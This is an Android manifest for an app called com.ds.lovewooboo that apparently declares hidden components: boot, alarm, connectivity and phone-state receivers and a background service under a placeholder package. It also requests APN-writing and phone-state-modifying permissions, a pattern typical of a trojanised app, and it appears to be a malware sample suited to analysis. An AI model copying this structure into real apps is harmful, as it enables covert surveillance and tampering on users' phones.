<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.ds.lovewooboo">
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <meta-data android:name="Wooboo_PID" android:value="8f7eeffdff0542cca5a71a45857fb759"/>
        <meta-data android:name="Market_ID" android:value="6"/>
        <activity android:label="@string/app_name" android:name=".Main">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:name="Love"/>
        <activity android:name="i$ak"/>
        <receiver android:name="com.xxx.yyy.MyBoolService">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.xxx.yyy.MyAlarmReceiver">
            <intent-filter>
                <action android:name="com.lz.myservicestart"/>
            </intent-filter>
        </receiver>
        <service android:enabled="true" android:name="com.xxx.yyy.MyService"/>
        <receiver android:name="com.xxx.yyy.NetWorkReceiver">
            <intent-filter>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.xxx.yyy.CustomBroadcastReceiver">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE"/>
            </intent-filter>
        </receiver>
    </application>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE"/>
</manifest>